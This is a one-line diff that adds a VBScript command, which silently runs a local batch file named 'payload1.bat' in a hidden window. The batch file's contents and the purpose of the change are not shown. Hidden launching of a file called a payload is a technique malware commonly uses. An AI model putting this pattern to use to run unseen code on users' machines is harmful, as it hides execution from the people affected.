@@ -1,0 +1,1 @@
+CreateObject("Wscript.Shell").Run "D:\gamerest\payload1.bat", 0, True
